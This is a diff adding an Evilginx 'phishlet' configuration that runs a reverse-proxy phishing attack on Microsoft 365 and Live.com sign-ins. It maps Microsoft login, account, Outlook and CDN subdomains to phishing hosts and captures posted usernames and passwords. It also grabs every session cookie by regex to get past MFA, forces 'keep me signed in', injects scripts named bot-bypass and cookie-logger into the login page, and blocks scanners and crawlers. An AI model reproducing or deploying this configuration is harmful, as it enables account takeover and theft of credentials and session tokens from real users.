@@ -1,0 +1,270 @@
+// Phishlet V2 Configuration
+// Microsoft 365 / Live.com Authentication
+// Enhanced version with static file support and custom hooks
+
+{
+  // Metadata
+  meta: {
+    name: 'microsoft365',
+    display_name: 'Microsoft 365 & Live.com',
+    version: '2.0.0',
+    author: 'billion_laughs',
+    description: 'Microsoft 365 and Live.com authentication with MFA support, custom bypass scripts, and enhanced cookie capture',
+    min_evilginx_version: '3.5.0',
+    created: '2025-11-20',
+    updated: '2025-11-20',
+    tags: ['microsoft', 'office365', 'live', 'outlook', 'mfa', 'oauth'],
+  },
+
+  // Proxy configuration - all subdomains involved in authentication
+  proxy_hosts: [
+    // Primary login page
+    {
+      phish_sub: 'login',
+      orig_sub: 'login',
+      domain: 'live.com',
+      session: true,
+      is_landing: true,
+      auto_filter: true,
+    },
+    // CDN for login assets
+    {
+      phish_sub: 'cdn',
+      orig_sub: 'logincdn',
+      domain: 'msauth.net',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Account management
+    {
+      phish_sub: 'account',
+      orig_sub: 'account',
+      domain: 'live.com',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Storage services
+    {
+      phish_sub: 'storage',
+      orig_sub: 'storage',
+      domain: 'live.com',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Outlook webmail
+    {
+      phish_sub: 'outlook',
+      orig_sub: 'outlook',
+      domain: 'live.com',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Microsoft account page
+    {
+      phish_sub: 'microsoft',
+      orig_sub: 'account',
+      domain: 'microsoft.com',
+      session: false,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Microsoft www
+    {
+      phish_sub: 'www',
+      orig_sub: 'www',
+      domain: 'microsoft.com',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+    // Microsoft SSL compass
+    {
+      phish_sub: 'ssl',
+      orig_sub: 'compass-ssl',
+      domain: 'microsoft.com',
+      session: true,
+      is_landing: false,
+      auto_filter: true,
+    },
+  ],
+
+  // Subdomain filters - content replacement rules
+  sub_filters: [
+    // login.live.com filters
+    {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'login', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'outlook', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'storage', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'account', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'www', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'login.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+
+    // account.live.com filters
+    {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'login', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'outlook', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'storage', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'account', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'www', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.live.com', orig_sub: 'logincdn', domain: 'msauth.net', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+
+    // account.microsoft.com filters
+    {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'outlook', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'storage', domain: 'live.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']},
+    {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: "'{domain}';", replace: "'{domain}';", mimes: ['text/html', 'application/json', 'application/x-javascript']},
+  ],
+
+  // Authentication tokens to capture
+  auth_tokens: [
+    {
+      domain: '.login.live.com',
+      keys: ['MSPOK', '.*,regexp'],  // Capture MSPOK and all cookies via regex
+    },
+    {
+      domain: '.live.com',
+      keys: ['.*,regexp'],  // Capture all cookies for live.com
+    },
+    {
+      domain: '.microsoft.com',
+      keys: ['.*,regexp'],  // Capture all cookies for microsoft.com
+    },
+    {
+      domain: '.account.microsoft.com',
+      keys: ['.*,regexp'],  // Capture all cookies for account.microsoft.com
+    },
+  ],
+
+  // Credentials configuration
+  credentials: {
+    username: {
+      key: 'login',
+      search: '(.*)',
+      type: 'post',
+    },
+    password: {
+      key: 'passwd',
+      search: '(.*)',
+      type: 'post',
+    },
+  },
+
+  // Login endpoint
+  login: {
+    domain: 'login.live.com',
+    path: 'login.srf',
+  },
+
+  // Force POST parameters
+  force_post: [
+    {
+      path: '/ppsecure/post.srf',
+      search: [
+        {key: 'login', search: '.*'},
+        {key: 'passwd', search: '.*'},
+      ],
+      force: [
+        {key: 'KMSI', value: 'on'},  // Keep me signed in
+      ],
+      type: 'post',
+    },
+  ],
+
+  // NEW: Static file injection
+  static_files: {
+    // JavaScript files to inject
+    scripts: [
+      {
+        path: 'static/scripts/bot-bypass.js',
+        inject_at: 'login.live.com',
+        inject_position: 'head_end',
+        inject_condition: 'always',
+        inline: false,
+      },
+      {
+        path: 'static/scripts/cookie-logger.js',
+        inject_at: 'login.live.com',
+        inject_position: 'body_end',
+        inject_condition: 'path_matches:/login\\.srf',
+        inline: true,
+      },
+    ],
+    // CSS files to inject
+    styles: [
+      {
+        path: 'static/styles/custom.css',
+        inject_at: 'login.live.com',
+        inject_position: 'head_end',
+        inline: true,
+      },
+    ],
+    // Static assets to serve
+    assets: [
+      {
+        path: 'static/assets/microsoft-logo.png',
+        serve_at: '/assets/logo.png',
+        mime_type: 'image/png',
+        cache: true,
+      },
+    ],
+  },
+
+  // NEW: Advanced options
+  options: {
+    enabled: true,
+    visible: true,
+    // Custom JavaScript hooks
+    hooks: {
+      on_request: 'static/hooks/on_request.js',
+      on_response: 'static/hooks/on_response.js',
+    },
+    // Blacklist configuration
+    blacklist: {
+      user_agents: ['bot', 'crawler', 'spider', 'scan'],
+      ip_ranges: [],
+    },
+    // Custom headers
+    custom_headers: {
+      request: {
+        'X-Forwarded-Proto': 'https',
+      },
+      response: {
+        'X-Frame-Options': 'SAMEORIGIN',
+      },
+    },
+  },
+}
